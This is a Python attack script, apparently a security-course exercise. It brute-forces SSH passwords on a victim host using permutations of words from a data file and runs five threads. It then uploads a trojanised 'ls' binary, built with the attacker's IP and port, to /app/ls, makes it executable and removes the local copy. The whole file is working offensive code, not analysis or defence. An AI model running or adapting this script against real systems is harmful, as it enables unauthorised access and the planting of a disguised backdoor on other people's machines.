#!/usr/bin/python3
import itertools, paramiko, sys, os
import threading
from virus import zip_ls, build_virus

def try_ssh(victim_ip: str, pswd: str):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        print(f'Trying password: {pswd}')
        client.connect(victim_ip, username='csc2024', password=pswd)
    except paramiko.ssh_exception.AuthenticationException as e:
        # print(f'{e}')
        client.close()
        return False
    except paramiko.ssh_exception.SSHException:
        # print(f'{e}')
        client.close()
        return False
    except EOFError:
        client.close()
        return False
    else:
        # print(f'Password found: {pswd}')
        return True


def crack_ssh(victim_ip: str, attacker_ip: str, attacker_port: int, pswds: list):
    global vctm_pswd
    for p in pswds:
        if try_ssh(victim_ip, p):
            print(f'Password found: {p}')
            vctm_pswd = p
        if vctm_pswd != "":
            break


def get_victim_data():
    dic = list()
    with open('victim.dat', 'r') as f:
        for line in f:
            if line.strip() not in dic:
                dic.append(line.strip())

    pwd_dic = dict()
    for i in range(1, len(dic)+1):
        pwd_dic[i] = list()
        for iter in itertools.permutations(dic, i):
            pwd = ""
            for word in iter:
                pwd += word
            pwd_dic[i].append(pwd)
    return pwd_dic


def send_ls(vctm_ip: str, atkr_ip: str, atkr_port: int):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(vctm_ip, username='csc2024', password=vctm_pswd)
    build_virus(atkr_ip, atkr_port, zip_ls())
    sftp = client.open_sftp()
    sftp.put('./fake_ls', '/app/ls')
    client.exec_command('chmod +x /app/ls')
    client.close()


if __name__ == '__main__':
    if len(sys.argv) != 4:
        print(f'Usage: {sys.argv[0]} <victim_ip> <attacker_ip> <attacker_port>')
        sys.exit(1)
    vctm_ip = sys.argv[1]
    atkr_ip = sys.argv[2]
    atkr_port = sys.argv[3]

    pswds_dict = get_victim_data()
    vctm_pswd = ""
    t_num = 5
    threads = [0] * t_num
    for key in pswds_dict:
        for i in range(0, t_num):
            if vctm_pswd != "":
                break
            if i == t_num-1:
                threads[i] = threading.Thread(target=crack_ssh,\
                    args=(vctm_ip, atkr_ip, atkr_port,\
                    pswds_dict[key][i*len(pswds_dict[key])//t_num:len(pswds_dict[key])]))
            else:
                threads[i] = threading.Thread(target=crack_ssh,\
                    args=(vctm_ip, atkr_ip, atkr_port,\
                    pswds_dict[key][i*len(pswds_dict[key])//t_num:(i+1)*len(pswds_dict[key])//t_num]))
            threads[i].start()
        if vctm_pswd != "":
            break
        for j in range(0, t_num):
            threads[j].join()
    send_ls(vctm_ip, atkr_ip, atkr_port)
    os.system("rm ./fake_ls")
